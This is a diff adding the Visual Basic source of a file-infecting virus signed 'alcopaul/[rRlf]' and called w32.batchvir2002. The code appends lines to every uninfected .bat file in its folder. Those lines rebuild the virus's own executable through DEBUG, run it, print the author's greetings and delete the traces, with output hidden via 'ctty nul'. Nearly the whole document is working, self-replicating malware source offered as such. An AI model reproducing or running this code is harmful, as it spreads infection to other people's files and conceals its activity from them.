@@ -1,0 +1,136 @@
+   '\\\\\\\\\\\\\\\\\\
+   'batchvir2002\\\\\\\
+   '\\\\\\\\\\\\\\\\\\\\
+
+   'produces a debugscript of itself and uses it to infect batch files in current directory
+
+   'alcopaul
+
+
+   Attribute VB_Name = "Module1"
+   Option Explicit
+   Sub Main()
+   On Error Resume Next
+   Dim r As String, d As String, d1 As String, a11 As String, a22 As String, batfile As String
+   Dim a As String, gs As String, lenhost As String, vc As String, mark As String, q As String, textline As String
+   Dim rrey, host
+   r = App.Path
+   If Right(r, 1) <> "\" Then r = r & "\"
+   batfile = Dir$(r & "*.bat")
+   While batfile <> ""
+   a = a & batfile & "/"
+   batfile = Dir$
+   Wend
+   rrey = Split(a, "/")
+   For Each host In rrey
+   If host = "" Then Exit For
+   Open r & host For Binary Access Read As #1
+   lenhost = (LOF(1))
+   vc = Space(lenhost)
+   Get #1, , vc
+   Close #1
+   mark = Right(vc, 10)
+   If mark <> "alcopaul" & vbCrLf Then
+   GoTo nope
+   Else
+   GoTo gggoop
+   End If
+   nope:
+   d = r & App.EXEName & ".com"
+   d1 = g1(d)
+   Randomize
+   a11 = Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9)
+   a22 = Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9) & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9)
+   Open r & host For Input As #1
+   Do While Not EOF(1)
+   Line Input #1, textline
+   q = q & textline & vbCrLf
+   Loop
+   Close #1
+   gs = Mid(q, 1, (Len(q) - 2))
+   Open r & host For Output As #1
+   Print #1, gs
+   Print #1, "@echo off"
+   Print #1, "ctty nul"
+   Print #1, d1
+   Print #1, "echo rcx>>" & "batvir"
+   Print #1, "echo " & Hex(FileLen(r & App.EXEName & ".com")) & ">>" & "batvir"
+   Print #1, "echo n" & r & a22 & ".com" & ">>" & "batvir"
+   Print #1, "echo w>>" & "batvir"
+   Print #1, "echo q>>" & "batvir"
+   Print #1, "debug < " & "batvir"
+   Print #1, "del batvir"
+   Print #1, r & a22 & ".com"
+   Print #1, "ctty con"
+   Print #1, "pause"
+   Print #1, "echo :::::::: w32.batchvir2002 ::::::::"
+   Print #1, "echo."
+   Print #1, "pause"
+   Print #1, "echo :::::::: greets : Arkhangel, Energy, jackie, Petik, philie, Slagehammer ::::::::"
+   Print #1, "echo."
+   Print #1, "pause"
+   Print #1, "echo :::::::: by alcopaul/[rRlf] ::::::::"
+   Print #1, "echo."
+   Print #1, "ctty nul"
+   Print #1, ":g"
+   Print #1, "if exist " & r & a22 & ".com goto a"
+   Print #1, "goto d"
+   Print #1, ":a"
+   Print #1, "del " & r & a22 & ".com"
+   Print #1, "goto g"
+   Print #1, ":d"
+   Print #1, "exit"
+   Print #1, "::alcopaul"
+   Close #1
+   Exit For
+   gggoop:
+   Next host
+   End Sub
+   Function g1(ggg As String)
+   On Error Resume Next
+   Dim bbyte As Byte
+   Dim i, b, xeh, xeh1, xeh2, a, q, rrr, xxx, n, gg, ttt, ddd, fff, gs, cunter, tercunt, e, s, xsx, sxs
+   Open ggg For Binary As #1
+   Do While Not EOF(1)
+   DoEvents
+   Get #1, , bbyte
+   e = Hex(bbyte)
+   If Len(e) = 1 Then e = "0" & Hex(bbyte)
+   a = a & e & " "
+   Loop
+   Close #1
+   a = a
+   xeh = Array("0", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F")
+   xeh1 = Array("1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "0")
+   xeh2 = Array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F")
+   For q = 1 To Len(a) Step 48
+   DoEvents
+   rrr = rrr + 1
+   xxx = xxx + 1
+   n = n + 1
+   gg = gg + 1 / 16
+   If gg = 16 Then
+   gg = 0
+   End If
+   If n = 17 Then
+   n = 1
+   End If
+   ttt = ttt + 1 / 256
+   If ttt = 256 Then
+   ttt = 0
+   End If
+   ddd = RTrim(Mid(a, q, 48))
+   fff = "echo e " & xeh2(Int(ttt)) & xeh1(Int(gg)) & xeh(n) & "0  " & ddd & ">>" & "batvir" & vbCrLf
+   If rrr = 16 Then
+   fff = "echo e " & xeh2(Int(ttt)) & "1" & xeh(n) & "0  " & ddd & ">>" & "batvir" & vbCrLf
+   gg = 15 / 16
+   End If
+   If xxx = 240 Then
+   fff = "echo e 0" & xeh1(Int(gg)) & xeh(n) & "0  " & ddd & ">>" & "batvir" & vbCrLf
+   ttt = 255 / 256
+   End If
+   gs = gs & fff
+   Next
+   gs = Mid(gs, 1, (Len(gs) - 2))
+   g1 = gs
+   End Function
